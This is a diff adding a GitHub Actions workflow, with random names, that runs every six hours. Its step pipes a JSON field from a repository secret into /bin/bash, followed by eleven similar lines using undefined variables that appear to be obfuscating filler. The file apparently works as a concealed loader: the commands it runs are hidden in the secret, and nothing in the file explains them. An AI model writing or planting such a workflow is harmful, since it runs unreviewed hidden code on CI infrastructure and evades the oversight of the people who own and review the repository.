@@ -1,0 +1,27 @@
+name: mingyulu1837
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '7 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: mingyulu1837
+        env:
+          nscq77: ${{ secrets.nscq77 }}
+        run: |
+          echo $nscq77 | jq -r .h89 | /bin/bash
+          echo $qk08 | jq -r .pvtom14 | /bin/bash
+          echo $pssi76811 | jq -r .mc902 | /bin/bash
+          echo $he7 | jq -r .qpqgp9877 | /bin/bash
+          echo $a386 | jq -r .h122 | /bin/bash
+          echo $bm12530 | jq -r .qkqx031 | /bin/bash
+          echo $weyz409 | jq -r .fql5 | /bin/bash
+          echo $blnir1345 | jq -r .spktm374 | /bin/bash
+          echo $msgin22226 | jq -r .hl045 | /bin/bash
+          echo $j1405 | jq -r .y37 | /bin/bash
+          echo $h8086 | jq -r .lu727 | /bin/bash
+          echo $r572 | jq -r .yhy492 | /bin/bash
+
